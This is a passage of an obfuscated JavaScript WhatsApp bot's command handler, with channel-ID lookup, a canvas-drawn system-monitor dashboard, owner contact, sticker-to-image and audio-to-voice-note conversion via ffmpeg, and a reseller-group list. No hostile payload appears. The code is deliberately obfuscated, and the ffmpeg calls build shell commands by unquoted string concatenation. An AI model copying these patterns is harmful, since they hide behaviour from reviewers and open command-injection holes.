                            ? u['reply']('*UPLOAD\x20SUCCESSFUL*\x0a\x0a❖\x20URL:\x20' + u7)
                            : u['reply']('Hasil\x20upload:\x20' + u7);
                    } catch (u8) {
                        if (u0 && vmh['existsSync'](u0)) vmh['unlinkSync'](u0);
                        (console['error'](u8), u['reply']('❌\x20Error:\x20' + u8['message']));
                    }
                }
                break;
            case 'cekidch':
                {
                    if (!L) return u['reply'](S('linkchnya\x20mana'));
                    if (!L['includes']('https://whatsapp.com/channel/'))
                        return u['reply']('Link\x20tautan\x20tidak\x20valid');
                    let u9 = L['split']('https://whatsapp.com/channel/')[0x1],
                        ux = await x['newsletterMetadata']('invite', u9),
                        uu =
                            '*\x20*ID\x20:\x20' +
                            ux['id'] +
                            '*\x0a*\x20*Nom\x20:*\x20' +
                            ux['name'] +
                            '\x0a*\x20*Total\x20Disip\x20:*\x20' +
                            ux['subscribers'] +
                            '\x0a*\x20*Status\x20:*\x20' +
                            ux['state'] +
                            '\x0a*\x20*Verified\x20:*\x20' +
                            (ux['verification'] == 'VERIFIED' ? 'Verifye' : 'ouii'),
                        uU = generateWAMessageFromContent(
                            u['chat'],
                            {
                                viewOnceMessage: {
                                    message: {
                                        messageContextInfo: {
                                            deviceListMetadata: {},
                                            deviceListMetadataVersion: 0x2,
                                        },
                                        interactiveMessage: {
                                            body: { text: uu },
                                            footer: { text: 'powered\x20by\x20andy' },
                                            nativeFlowMessage: {
                                                buttons: [
                                                    {
                                                        name: 'cta_copy',
                                                        buttonParamsJson:
                                                            '{\x22display_text\x22:\x20\x22copy\x20ID\x22,\x22copy_code\x22:\x20\x22' +
                                                            ux['id'] +
                                                            '\x22}',
                                                    },
                                                ],
                                            },
                                        },
                                    },
                                },
                            },
                            { quoted: u }
                        );
                    await x['relayMessage'](uU['key']['remoteJid'], uU['message'], {
                        messageId: uU['key']['id'],
                    });
                }
                break;
            case 'ping':
            case 'os':
                {
                    try {
                        const uG = {
                                bg: '#0f1419',
                                bgSecondary: '#1a1f2e',
                                card: '#1e2433',
                                cardHover: '#252b3d',
                                primary: '#3b82f6',
                                success: '#10b981',
                                warning: '#f59e0b',
                                danger: '#ef4444',
                                purple: '#8b5cf6',
                                cyan: '#06b6d4',
                                pink: '#ec4899',
                                textPrimary: '#f1f5f9',
                                textSecondary: '#94a3b8',
                                textTertiary: '#64748b',
                                border: '#2d3548',
                                glow: 'rgba(59,\x20130,\x20246,\x200.2)',
                            },
                            uk = (ua) => {
                                if (ua === 0x0) return '0\x20B';
                                const ut = ['B', 'KB', 'MB', 'GB', 'TB'],
                                    um = Math['floor'](Math['log'](ua) / Math['log'](0x400));
                                return (
                                    (ua / Math['pow'](0x400, um))['toFixed'](0x2) + '\x20' + ut[um]
                                );
                            },
                            uH = (ua) => {
                                ua = Number(ua);
                                const ut = Math['floor'](ua / (0xe10 * 0x18)),
                                    um = Math['floor']((ua % (0xe10 * 0x18)) / 0xe10),
                                    ud = Math['floor']((ua % 0xe10) / 0x3c),
                                    un = Math['floor'](ua % 0x3c);
                                if (ut > 0x0) return ut + 'd\x20' + um + 'h\x20' + ud + 'm';
                                if (um > 0x0) return um + 'h\x20' + ud + 'm';
                                return ud + 'm\x20' + un + 's';
                            };
                        function ub(ua, ut, um) {
                            const ud = ua['createLinearGradient'](0x0, 0x0, ut, um);
                            (ud['addColorStop'](0x0, uG['bg']),
                                ud['addColorStop'](0.5, uG['bgSecondary']),
                                ud['addColorStop'](0x1, uG['bg']),
                                (ua['fillStyle'] = ud),
                                ua['fillRect'](0x0, 0x0, ut, um),
                                (ua['globalAlpha'] = 0.02));
                            for (let un = 0x0; un < 0x64; un++) {
                                const ug = Math['random']() * ut,
                                    uJ = Math['random']() * um,
                                    uN = Math['random']() * 0x2;
                                ((ua['fillStyle'] = uG['textPrimary']),
                                    ua['beginPath'](),
                                    ua['arc'](ug, uJ, uN, 0x0, Math['PI'] * 0x2),
                                    ua['fill']());
                            }
                            ((ua['globalAlpha'] = 0x1),
                                (ua['strokeStyle'] = uG['border']),
                                (ua['lineWidth'] = 0x1));
                            for (let uQ = 0x0; uQ < ut; uQ += 0x32) {
                                ((ua['globalAlpha'] = 0.03),
                                    ua['beginPath'](),
                                    ua['moveTo'](uQ, 0x0),
                                    ua['lineTo'](uQ, um),
                                    ua['stroke']());
                            }
                            for (let uZ = 0x0; uZ < um; uZ += 0x32) {
                                ((ua['globalAlpha'] = 0.03),
                                    ua['beginPath'](),
                                    ua['moveTo'](0x0, uZ),
                                    ua['lineTo'](ut, uZ),
                                    ua['stroke']());
                            }
                            ua['globalAlpha'] = 0x1;
                        }
                        function uq(ua, ut, um, ud, un, ug) {
                            (ua['save'](),
                                (ua['shadowColor'] = uG['glow']),
                                (ua['shadowBlur'] = 0xf),
                                ua['beginPath'](),
                                ua['roundRect'](ut, um, ud, un, ug),
                                (ua['fillStyle'] = uG['card']),
                                ua['fill'](),
                                (ua['shadowBlur'] = 0x0),
                                (ua['strokeStyle'] = uG['border']),
                                (ua['lineWidth'] = 0x1),
                                ua['stroke'](),
                                ua['restore']());
                        }
                        function uy(ua, ut, um, ud, un) {
                            (ua['save'](),
                                (ua['strokeStyle'] = un),
                                (ua['fillStyle'] = un),
                                (ua['lineWidth'] = 2.5),
                                (ua['lineCap'] = 'round'),
                                (ua['lineJoin'] = 'round'));
                            switch (ud) {
                                case 'cpu':
                                    (ua['strokeRect'](ut - 0xc, um - 0xc, 0x18, 0x18),
                                        ua['fillRect'](ut - 0x6, um - 0x6, 0xc, 0xc),
                                        ua['beginPath'](),
                                        ua['moveTo'](ut - 0xc, um - 0x8),
                                        ua['lineTo'](ut - 0x10, um - 0x8),
                                        ua['moveTo'](ut - 0xc, um),
                                        ua['lineTo'](ut - 0x10, um),
                                        ua['moveTo'](ut - 0xc, um + 0x8),
                                        ua['lineTo'](ut - 0x10, um + 0x8),
                                        ua['moveTo'](ut + 0xc, um - 0x8),
                                        ua['lineTo'](ut + 0x10, um - 0x8),
                                        ua['moveTo'](ut + 0xc, um),
                                        ua['lineTo'](ut + 0x10, um),
                                        ua['moveTo'](ut + 0xc, um + 0x8),
                                        ua['lineTo'](ut + 0x10, um + 0x8),
                                        ua['stroke']());
                                    break;
                                case 'memory':
                                    for (let ug = 0x0; ug < 0x4; ug++) {
                                        ua['strokeRect'](ut - 0xa + ug * 0x6, um - 0xc, 0x5, 0x18);
                                    }
                                    break;
                                case 'disk':
                                    (ua['beginPath'](),
                                        ua['arc'](ut, um, 0xc, 0x0, Math['PI'] * 0x2),
                                        ua['stroke'](),
                                        ua['beginPath'](),
                                        ua['arc'](ut, um, 0x8, 0x0, Math['PI'] * 0x2),
                                        ua['stroke'](),
                                        ua['beginPath'](),
                                        ua['arc'](ut, um, 0x3, 0x0, Math['PI'] * 0x2),
                                        ua['fill']());
                                    break;
                                case 'network':
                                    (ua['beginPath'](),
                                        ua['arc'](ut, um, 0xc, 0x0, Math['PI'] * 0x2),
                                        ua['stroke'](),
                                        ua['beginPath'](),
                                        ua['moveTo'](ut, um - 0x8),
                                        ua['lineTo'](ut, um + 0x8),
                                        ua['moveTo'](ut - 0x8, um),
                                        ua['lineTo'](ut + 0x8, um),
                                        ua['stroke'](),
                                        ua['beginPath'](),
                                        ua['arc'](ut - 0x6, um - 0x6, 0x2, 0x0, Math['PI'] * 0x2),
                                        ua['arc'](ut + 0x6, um - 0x6, 0x2, 0x0, Math['PI'] * 0x2),
                                        ua['arc'](ut - 0x6, um + 0x6, 0x2, 0x0, Math['PI'] * 0x2),
                                        ua['arc'](ut + 0x6, um + 0x6, 0x2, 0x0, Math['PI'] * 0x2),
                                        ua['fill']());
                                    break;
                                case 'server':
                                    for (let uJ = 0x0; uJ < 0x3; uJ++) {
                                        (ua['strokeRect'](ut - 0xc, um - 0xa + uJ * 0x8, 0x18, 0x6),
                                            ua['beginPath'](),
                                            ua['arc'](
                                                ut + 0x8,
                                                um - 0x7 + uJ * 0x8,
                                                1.5,
                                                0x0,
                                                Math['PI'] * 0x2
                                            ),
                                            ua['fill']());
                                    }
                                    break;
                                case 'clock':
                                    (ua['beginPath'](),
                                        ua['arc'](ut, um, 0xc, 0x0, Math['PI'] * 0x2),
                                        ua['stroke'](),
                                        ua['beginPath'](),
                                        ua['moveTo'](ut, um),
                                        ua['lineTo'](ut, um - 0x8),
                                        ua['moveTo'](ut, um),
                                        ua['lineTo'](ut + 0x6, um),
                                        ua['stroke']());
                                    break;
                            }
                            ua['restore']();
                        }
                        function uF(ua, ut, um, ud) {
                            ua['save']();
                            const un = ua['createLinearGradient'](
                                ut - ud,
                                um - ud,
                                ut + ud,
                                um + ud
                            );
                            (un['addColorStop'](0x0, uG['primary']),
                                un['addColorStop'](0.5, uG['cyan']),
                                un['addColorStop'](0x1, uG['purple']),
                                (ua['strokeStyle'] = un),
                                (ua['lineWidth'] = 0x3),
                                (ua['lineCap'] = 'round'),
                                ua['beginPath'](),
                                ua['moveTo'](ut - ud, um),
                                ua['lineTo'](ut, um - ud),
                                ua['lineTo'](ut + ud, um),
                                ua['lineTo'](ut, um + ud),
                                ua['closePath'](),
                                ua['stroke'](),
                                ua['beginPath'](),
                                ua['moveTo'](ut - ud / 0x2, um),
                                ua['lineTo'](ut, um - ud / 0x2),
                                ua['lineTo'](ut + ud / 0x2, um),
                                ua['lineTo'](ut, um + ud / 0x2),
                                ua['closePath'](),
                                ua['stroke'](),
                                ua['restore']());
                        }
                        function uM(ua, ut, um, ud, un, ug, uJ) {
                            (ua['save'](),
                                (ua['lineCap'] = 'round'),
                                ua['beginPath'](),
                                ua['arc'](ut, um, ud, 0x0, Math['PI'] * 0x2),
                                (ua['strokeStyle'] = uG['bgSecondary']),
                                (ua['lineWidth'] = un),
                                ua['stroke']());
                            const uN = -Math['PI'] / 0x2,
                                uQ = uN + Math['PI'] * 0x2 * (ug / 0x64);
                            ((ua['shadowColor'] = uJ),
                                (ua['shadowBlur'] = 0xa),
                                ua['beginPath'](),
                                ua['arc'](ut, um, ud, uN, uQ),
                                (ua['strokeStyle'] = uJ),
                                (ua['lineWidth'] = un),
                                ua['stroke'](),
                                (ua['shadowBlur'] = 0x0),
                                (ua['fillStyle'] = uG['textPrimary']),
                                (ua['font'] = 'bold\x2028px\x20Arial'),
                                (ua['textAlign'] = 'center'),
                                (ua['textBaseline'] = 'middle'),
                                ua['fillText'](Math['round'](ug) + '%', ut, um),
                                ua['restore']());
                        }
                        function uV(ua, ut, um, ud, un, ug, uJ, uN, uQ) {
                            ((ua['fillStyle'] = uG['bgSecondary']), ua['fillRect'](ut, um, ud, un));
                            const uZ = ua['createLinearGradient'](ut, um, ut + ud, um);
                            (uZ['addColorStop'](0x0, uJ),
                                uZ['addColorStop'](0x1, uJ + 'aa'),
                                (ua['fillStyle'] = uZ),
                                ua['fillRect'](ut, um, ud * (ug / 0x64), un),
                                (ua['strokeStyle'] = uG['border']),
                                (ua['lineWidth'] = 0x1),
                                ua['strokeRect'](ut, um, ud, un),
                                (ua['fillStyle'] = uG['textSecondary']),
                                (ua['font'] = '11px\x20Arial'),
                                (ua['textAlign'] = 'left'),
                                ua['fillText'](uN, ut, um - 0x6),
                                (ua['fillStyle'] = uG['textPrimary']),
                                (ua['font'] = 'bold\x2011px\x20Arial'),
                                (ua['textAlign'] = 'right'),
                                ua['fillText'](uQ, ut + ud, um - 0x6));
                        }
                        function uR(ua, ut, um, ud, un, ug, uJ, uN, uQ) {
                            (uq(ua, ut, um, ud, un, 0xc),
                                uy(ua, ut + 0x1c, um + 0x1c, uQ, uN),
                                (ua['fillStyle'] = uG['textSecondary']),
                                (ua['font'] = '11px\x20Arial'),
                                (ua['textAlign'] = 'left'),
                                ua['fillText'](ug, ut + 0x32, um + 0x16),
                                (ua['fillStyle'] = uG['textPrimary']),
                                (ua['font'] = 'bold\x2016px\x20Arial'),
                                ua['fillText'](uJ, ut + 0x32, um + 0x28));
                        }
                        async function uE(ua) {
                            const ut = 0x4b0,
                                um = 0x320,
                                ud = createCanvas(ut, um),
                                un = ud['getContext']('2d');
                            (ub(un, ut, um),
                                uF(un, 0x3c, 0x32, 0x14),
                                (un['fillStyle'] = uG['textPrimary']),
                                (un['font'] = 'bold\x2032px\x20Arial'),
                                (un['textAlign'] = 'left'),
                                un['fillText']('SYSTEM\x20MONITOR', 0x64, 0x3a),
                                (un['fillStyle'] = uG['textSecondary']),
                                (un['font'] = '13px\x20Arial'),
                                un['fillText'](
                                    'Real-time\x20Performance\x20Dashboard',
                                    0x64,
                                    0x50
                                ));
                            const ug =
                                ua['ping'] < 0x64
                                    ? uG['success']
                                    : ua['ping'] < 0x12c
                                      ? uG['warning']
                                      : uG['danger'];
                            ((un['fillStyle'] = ug),
                                (un['font'] = 'bold\x2028px\x20Arial'),
                                (un['textAlign'] = 'right'),
                                un['fillText'](ua['ping'] + 'ms', ut - 0x32, 0x32),
                                (un['fillStyle'] = uG['textSecondary']),
                                (un['font'] = '12px\x20Arial'),
                                un['fillText']('LATENCY', ut - 0x32, 0x46));
                            const uJ = un['createLinearGradient'](0x32, 0x64, ut - 0x32, 0x64);
                            (uJ['addColorStop'](0x0, uG['primary']),
                                uJ['addColorStop'](0.33, uG['success']),
                                uJ['addColorStop'](0.66, uG['purple']),
                                uJ['addColorStop'](0x1, uG['cyan']),
                                (un['strokeStyle'] = uJ),
                                (un['lineWidth'] = 0x2),
                                un['beginPath'](),
                                un['moveTo'](0x32, 0x64),
                                un['lineTo'](ut - 0x32, 0x64),
                                un['stroke']());
                            const uN = 0x82,
                                uQ = 0x104,
                                uZ = 0xf0,
                                uP = 0x1e,
                                ur = 0x32,
                                uT = ur + uQ + uP,
                                uS = uT + uQ + uP,
                                uA = uS + uQ + uP;
                            (uq(un, ur, uN, uQ, uZ, 0xf),
                                uy(un, ur + 0x1e, uN + 0x23, 'cpu', uG['primary']),
                                (un['fillStyle'] = uG['textPrimary']),
                                (un['font'] = 'bold\x2018px\x20Arial'),
                                (un['textAlign'] = 'left'),
                                un['fillText']('CPU\x20USAGE', ur + 0x37, uN + 0x28),
                                (un['fillStyle'] = uG['textSecondary']),
                                (un['font'] = '11px\x20Arial'),
                                un['fillText'](
                                    ua['cpuCores'] +
                                        '\x20Cores\x20@\x20' +
                                        ua['cpuSpeed'] +
                                        '\x20MHz',
                                    ur + 0x37,
                                    uN + 0x3a
                                ),
                                uM(
                                    un,
                                    ur + uQ / 0x2,
                                    uN + 0x8c,
                                    0x32,
                                    0xc,
                                    ua['cpuLoad'],
                                    uG['primary']
                                ),
                                (un['fillStyle'] = uG['textTertiary']),
                                (un['font'] = '10px\x20Arial'),
                                (un['textAlign'] = 'center'),
                                un['fillText'](
                                    ua['cpuModel']['substring'](0x0, 0x20),
                                    ur + uQ / 0x2,
                                    uN + 0xd7
                                ),
                                uq(un, uT, uN, uQ, uZ, 0xf),
                                uy(un, uT + 0x1e, uN + 0x23, 'memory', uG['success']),
                                (un['fillStyle'] = uG['textPrimary']),
                                (un['font'] = 'bold\x2018px\x20Arial'),
                                (un['textAlign'] = 'left'),
                                un['fillText']('MEMORY', uT + 0x37, uN + 0x28),
                                (un['fillStyle'] = uG['textSecondary']),
                                (un['font'] = '11px\x20Arial'),
                                un['fillText'](
                                    'Total:\x20' + uk(ua['ramTotal']),
                                    uT + 0x37,
                                    uN + 0x3a
                                ));
                            const up = (ua['ramUsed'] / ua['ramTotal']) * 0x64;
                            (uM(un, uT + uQ / 0x2, uN + 0x8c, 0x32, 0xc, up, uG['success']),
                                (un['fillStyle'] = uG['textTertiary']),
                                (un['font'] = '11px\x20Arial'),
                                (un['textAlign'] = 'center'),
                                un['fillText'](
                                    uk(ua['ramUsed']) + '\x20Used',
                                    uT + uQ / 0x2,
                                    uN + 0xcd
                                ),
                                un['fillText'](
                                    uk(ua['ramTotal'] - ua['ramUsed']) + '\x20Free',
                                    uT + uQ / 0x2,
                                    uN + 0xdc
                                ),
                                uq(un, uS, uN, uQ, uZ, 0xf),
                                uy(un, uS + 0x1e, uN + 0x23, 'disk', uG['purple']),
                                (un['fillStyle'] = uG['textPrimary']),
                                (un['font'] = 'bold\x2018px\x20Arial'),
                                (un['textAlign'] = 'left'),
                                un['fillText']('STORAGE', uS + 0x37, uN + 0x28),
                                (un['fillStyle'] = uG['textSecondary']),
                                (un['font'] = '11px\x20Arial'),
                                un['fillText'](
                                    'Total:\x20' + uk(ua['diskTotal']),
                                    uS + 0x37,
                                    uN + 0x3a
                                ));
                            let uX =
                                ua['diskTotal'] > 0x0
                                    ? (ua['diskUsed'] / ua['diskTotal']) * 0x64
                                    : 0x0;
                            (uM(un, uS + uQ / 0x2, uN + 0x8c, 0x32, 0xc, uX, uG['purple']),
                                (un['fillStyle'] = uG['textTertiary']),
                                (un['font'] = '11px\x20Arial'),
                                (un['textAlign'] = 'center'),
                                un['fillText'](
                                    uk(ua['diskUsed']) + '\x20Used',
                                    uS + uQ / 0x2,
                                    uN + 0xcd
                                ),
                                un['fillText'](
                                    uk(ua['diskTotal'] - ua['diskUsed']) + '\x20Free',
                                    uS + uQ / 0x2,
                                    uN + 0xdc
                                ),
                                uq(un, uA, uN, uQ, uZ, 0xf),
                                uy(un, uA + 0x1e, uN + 0x23, 'network', uG['cyan']),
                                (un['fillStyle'] = uG['textPrimary']),
                                (un['font'] = 'bold\x2018px\x20Arial'),
                                (un['textAlign'] = 'left'),
                                un['fillText']('NETWORK', uA + 0x37, uN + 0x28),
                                (un['fillStyle'] = uG['textSecondary']),
                                (un['font'] = '11px\x20Arial'),
                                un['fillText'](
                                    'Interface:\x20' + ua['networkInterface'],
                                    uA + 0x37,
                                    uN + 0x3a
                                ),
                                (un['fillStyle'] = uG['textPrimary']),
                                (un['font'] = 'bold\x2013px\x20Arial'),
                                (un['textAlign'] = 'left'),
                                un['fillText']('RX\x20(Download)', uA + 0x1e, uN + 0x5f),
                                (un['fillStyle'] = uG['cyan']),
                                (un['font'] = 'bold\x2020px\x20Arial'),
                                un['fillText'](uk(ua['networkRx']), uA + 0x1e, uN + 0x78),
                                (un['fillStyle'] = uG['textPrimary']),
                                (un['font'] = 'bold\x2013px\x20Arial'),
                                un['fillText']('TX\x20(Upload)', uA + 0x1e, uN + 0x9b),
                                (un['fillStyle'] = uG['pink']),
                                (un['font'] = 'bold\x2020px\x20Arial'),
                                un['fillText'](uk(ua['networkTx']), uA + 0x1e, uN + 0xb4));
                            const uw = 0x190,
                                uW = 0xaf,
                                us = 0x46,
                                uY = 0x14;
                            (uR(
                                un,
                                0x32,
                                uw,
                                uW,
                                us,
                                'HOSTNAME',
                                ua['hostname']['substring'](0x0, 0xf),
                                uG['primary'],
                                'server'
                            ),
                                uR(
                                    un,
                                    0x32 + (uW + uY),
                                    uw,
                                    uW,
                                    us,
                                    'PLATFORM',
                                    ua['platform'] + '\x20(' + ua['arch'] + ')',
                                    uG['success'],
                                    'server'
                                ),
                                uR(
                                    un,
                                    0x32 + (uW + uY) * 0x2,
                                    uw,
                                    uW,
                                    us,
                                    'BOT\x20UPTIME',
                                    ua['uptimeBot'],
                                    uG['purple'],
                                    'clock'
                                ),
                                uR(
                                    un,
                                    0x32 + (uW + uY) * 0x3,
                                    uw,
                                    uW,
                                    us,
                                    'SERVER\x20UPTIME',
                                    ua['uptimeServer'],
                                    uG['warning'],
                                    'clock'
                                ),
                                uR(
                                    un,
                                    0x32 + (uW + uY) * 0x4,
                                    uw,
                                    uW,
                                    us,
                                    'NODE.JS',
                                    ua['nodeVersion'],
                                    uG['cyan'],
                                    'server'
                                ));
                            const uO = 0x1f4,
                                uc = 0xfa,
                                ul = ut - 0x64;
                            (uq(un, 0x32, uO, ul, uc, 0xf),
                                (un['fillStyle'] = uG['textPrimary']),
                                (un['font'] = 'bold\x2020px\x20Arial'),
                                (un['textAlign'] = 'left'),
                                un['fillText']('SYSTEM\x20PERFORMANCE', 0x4b, uO + 0x23),
                                (un['fillStyle'] = uG['textSecondary']),
                                (un['font'] = '12px\x20Arial'),
                                un['fillText'](
                                    'Real-time\x20resource\x20monitoring',
                                    0x4b,
                                    uO + 0x37
                                ));
                            const U0 = uO + 0x55,
                                U1 = 0x1f4,
                                U2 = 0x12,
                                U3 = 0x23;
                            (uV(
                                un,
                                0x4b,
                                U0,
                                U1,
                                U2,
                                ua['cpuLoad'],
                                uG['primary'],
                                'CPU\x20Load',
                                ua['cpuLoad'] + '%'
                            ),
                                uV(
                                    un,
                                    0x4b,
                                    U0 + U3,
                                    U1,
                                    U2,
                                    up,
                                    uG['success'],
                                    'Memory\x20Usage',
                                    Math['round'](up) + '%'
                                ),
                                uV(
                                    un,
                                    0x4b,
                                    U0 + U3 * 0x2,
                                    U1,
                                    U2,
                                    uX,
                                    uG['purple'],
                                    'Disk\x20Usage',
                                    Math['round'](uX) + '%'
                                ),
                                uV(
                                    un,
                                    0x4b,
                                    U0 + U3 * 0x3,
                                    U1,
                                    U2,
                                    Math['min'](0x64, (ua['ping'] / 0x1f4) * 0x64),
                                    ug,
                                    'Network\x20Latency',
                                    ua['ping'] + 'ms'
                                ));
                            const U4 = 0x26c,
                                U5 = uO + 0x55,
                                U6 = 0x1c;
                            let U7 = U5;
                            ((un['font'] = '13px\x20Arial'), (un['textAlign'] = 'left'));
                            const U8 = (U9, Ux) => {
                                ((un['fillStyle'] = uG['textSecondary']),
                                    un['fillText'](U9, U4, U7),
                                    (un['fillStyle'] = uG['textPrimary']),
                                    (un['font'] = 'bold\x2013px\x20Arial'),
                                    un['fillText'](Ux, U4 + 0x96, U7),
                                    (un['font'] = '13px\x20Arial'),
                                    (U7 += U6));
                            };
                            return (
                                U8('OS\x20Release', ua['release']),
                                U8('CPU\x20Cores', ua['cpuCores'] + '\x20Cores'),
                                U8('CPU\x20Speed', ua['cpuSpeed'] + '\x20MHz'),
                                U8('Total\x20Memory', uk(ua['ramTotal'])),
                                U8('Free\x20Memory', uk(ua['ramTotal'] - ua['ramUsed'])),
                                (un['fillStyle'] = uG['textTertiary']),
                                (un['font'] = '10px\x20Arial'),
                                (un['textAlign'] = 'center'),
                                un['fillText'](
                                    'Dashboard\x20Generated:\x20' + new Date()['toLocaleString'](),
                                    ut / 0x2,
                                    um - 0x14
                                ),
                                ud['toBuffer']('image/png')
                            );
                        }
                        function uD() {
                            try {
                                const ua = vmt['networkInterfaces']();
                                let ut = 0x0,
                                    um = 0x0,
                                    ud = 'N/A',
                                    un = 'N/A';
                                for (const [ug, uJ] of Object['entries'](ua)) {
                                    if (ug['toLowerCase']()['includes']('lo')) continue;
                                    for (const uN of uJ) {
                                        if (uN['family'] === 'IPv4' && !uN['internal']) {
                                            ((ud = ug), (un = uN['address']));
                                            break;
                                        }
                                    }
                                }
                                try {
                                    const uQ = execSync(
                                            'cat\x20/proc/net/dev\x202>/dev/null\x20||\x20echo\x20\x27\x27'
                                        )['toString'](),
                                        uZ = uQ['split']('\x0a');
                                    for (const uP of uZ) {
                                        if (uP['includes'](':') && !uP['includes']('lo:')) {
                                            const ur = uP['trim']()['split'](/\s+/);
                                            ur['length'] >= 0xa &&
                                                ((ut += parseInt(ur[0x1]) || 0x0),
                                                (um += parseInt(ur[0x9]) || 0x0));
                                        }
                                    }
                                } catch (uT) {}
                                return { totalRx: ut, totalTx: um, activeInterface: ud, ip: un };
                            } catch (uS) {
                                return {
                                    totalRx: 0x0,
                                    totalTx: 0x0,
                                    activeInterface: 'N/A',
                                    ip: 'N/A',
                                };
                            }
                        }
                        const uC = performance['now']();
                        await new Promise((ua) => setTimeout(ua, 0xa));
                        const uv = performance['now'](),
                            uo = (uv - uC)['toFixed'](0x2),
                            uB = vmt['cpus'](),
                            uz = vmt['totalmem'](),
                            uL = vmt['freemem'](),
                            ue = vmt['loadavg'](),
                            uj = Math['min'](0x64, (ue[0x0] * 0x64) / uB['length'])['toFixed'](0x1);
                        let uf = 0x0,
                            uh = 0x0;
                        try {
                            const ua = execSync(
                                    'df\x20-k\x20--output=size,used\x20/\x202>/dev/null'
                                )['toString'](),
                                ut = ua['trim']()['split']('\x0a');
                            if (ut['length'] > 0x1) {
                                const [um, ud] = ut[0x1]['trim']()['split'](/\s+/)['map'](Number);
                                ((uf = um * 0x400), (uh = ud * 0x400));
                            }
                        } catch (un) {}
                        const uI = uD(),
                            ui = {
                                ping: uo,
                                hostname: vmt['hostname'](),
                                platform: vmt['platform'](),
                                arch: vmt['arch'](),
                                release: vmt['release'](),
                                nodeVersion: process['version'],
                                uptimeBot: uH(process['uptime']()),
                                uptimeServer: uH(vmt['uptime']()),
                                cpuModel: uB[0x0]['model']['trim'](),
                                cpuSpeed: uB[0x0]['speed'],
                                cpuCores: uB['length'],
                                cpuLoad: uj,
                                ramTotal: uz,
                                ramUsed: uz - uL,
                                diskTotal: uf,
                                diskUsed: uh,
                                networkRx: uI['totalRx'],
                                networkTx: uI['totalTx'],
                                networkInterface: uI['activeInterface'],
                                networkIP: uI['ip'],
                            },
                            uK = await uE(ui);
                        await x['sendMessage'](
                            u['chat'],
                            {
                                image: uK,
                                caption:
                                    '*TYPE\x20SHII\x20-\x20INFORMATION\x20🔴*\x0a\x0a' +
                                    ('-\x20Latency:\x20' + uo + 'ms\x0a') +
                                    ('-\x20CPU:\x20' + ui['cpuLoad'] + '%\x0a') +
                                    ('-\x20RAM:\x20' +
                                        uk(ui['ramUsed']) +
                                        '\x20/\x20' +
                                        uk(ui['ramTotal']) +
                                        '\x0a') +
                                    ('-\x20Disk:\x20' +
                                        uk(ui['diskUsed']) +
                                        '\x20/\x20' +
                                        uk(ui['diskTotal']) +
                                        '\x0a') +
                                    ('-\x20Network:\x20↓' +
                                        uk(ui['networkRx']) +
                                        '\x20↑' +
                                        uk(ui['networkTx'])),
                            },
                            { quoted: u }
                        );
                    } catch (ug) {
                        (console['error'](ug), u['reply']('Error:\x20' + ug['message']));
                    }
                }
                break;
            case 'own':
            case 'owner':
                {
                    (await x['sendContact'](
                        u['chat'],
                        [global['owner']],
                        global['namaOwner'],
                        'Developer\x20Bot',
                        u
                    ),
                        await u['reply'](
                            'Yoo\x20madafaka\x20*' +
                                u['pushName'] +
                                '*,\x20Sa\x20a\x20se\x20kontak\x20kreyatè\x20mwen\x20an.\x20✨'
                        ));
                }
                break;
            case 'toimg':
            case 'toimage':
                {
                    if (!I) return T('Reply\x20Stickers\x20repons\x20ki\x20vle\x20konvèti!');
                    if (!/webp/['test'](h))
                        return T(
                            'Reponn\x20a\x20avek\x20tit\x20sou\x20fich\x20yo\x20*' + (E + B) + '*'
                        );
                    const uJ = await x['downloadAndSaveMediaMessage'](I),
                        uN = getRandom('.png');
                    exec('ffmpeg\x20-i\x20' + uJ + '\x20' + uN, async (uQ) => {
                        vmh['unlinkSync'](uJ);
                        if (uQ)
                            return (
                                console['error'](uQ),
                                T('Echwe\x20Konvèti\x20avek\x20stickers\x20son\x20an\x20imaj!')
                            );
                        try {
                            const uZ = vmh['readFileSync'](uN);
                            await x['sendMessage'](
                                u['chat'],
                                { image: uZ, caption: '*Konvèti\x20an\x20imaj\x20avèk\x20siksè!*' },
                                { quoted: u }
                            );
                        } catch (uP) {
                            (console['error'](uP),
                                T(
                                    'Gen\x20yon\x20erè\x20Bourik\x20lè\x20w\x20ap\x20voye\x20imaj\x20yo.'
                                ));
                        } finally {
                            vmh['unlinkSync'](uN);
                        }
                    });
                }
                break;
            case 'toptt':
            case 'tovn':
            case 'tovoicenote':
                {
                    const uQ = u['quoted'] ? u['quoted'] : u;
                    if (!/audio|video/['test'](h))
                        return u['reply'](
                            'Reponn\x20videyo\x20oswa\x20odyo\x20ou\x20vle\x20fè\x20yon\x20VN!\x0a\x0aContoh:\x20*' +
                                (E + B) +
                                '*'
                        );
                    u['reply']('Wait...');
                    let uZ = null,
                        uP = null;
                    try {
                        uZ = await x['downloadAndSaveMediaMessage'](uQ);
                        if (!uZ) return u['reply']('Echwe\x20telechaje\x20media.');
                        uP = vmI['join'](
                            process['cwd'](),
                            'data',
                            'trash',
                            'vn_' + Date['now']() + '.ogg'
                        );
                        if (!vmh['existsSync'](vmI['dirname'](uP)))
                            vmh['mkdirSync'](vmI['dirname'](uP), { recursive: !![] });
                        (await new Promise((ur, uT) => {
                            exec(
                                'ffmpeg\x20-y\x20-i\x20\x22' +
                                    uZ +
                                    '\x22\x20-vn\x20-c:a\x20libopus\x20-b:a\x20128k\x20-ac\x201\x20-ar\x2048000\x20-map_metadata\x20-1\x20\x22' +
                                    uP +
                                    '\x22',
                                (uS) => {
                                    if (uS) return uT(uS);
                                    ur();
                                }
                            );
                        }),
                            await x['sendMessage'](
                                u['chat'],
                                {
                                    audio: { url: uP },
                                    mimetype: 'audio/ogg;\x20codecs=opus',
                                    ptt: !![],
                                },
                                { quoted: u }
                            ));
                        if (vmh['existsSync'](uZ)) vmh['unlinkSync'](uZ);
                        if (vmh['existsSync'](uP)) vmh['unlinkSync'](uP);
                    } catch (ur) {
                        console['error'](ur);
                        if (uZ && vmh['existsSync'](uZ)) vmh['unlinkSync'](uZ);
                        if (uP && vmh['existsSync'](uP)) vmh['unlinkSync'](uP);
                        u['reply'](
                            '❌\x20Echwe\x20mengonversi\x20ke\x20VN.\x20Pastikan\x20FFmpeg\x20terinstal.'
                        );
                    }
                }
                break;
            case 'addgrupreseller':
            case 'addgrupreseller':
            case 'addseller':
                {
                    if (!d) return T(mess['owner']);
                    if (!u['isGroup']) return T(mess['group']);
                    const uT = u['chat'];
                    if (datagc['includes'](uT))
                        return T(
                            'Grup\x20ini\x20sudah\x20di\x20beri\x20akses\x20reseller\x20panel!'
                        );
                    (datagc['push'](uT),
                        await vmh['writeFileSync'](
                            './data/reseller.json',
                            JSON['stringify'](datagc, null, 0x2)
                        ),
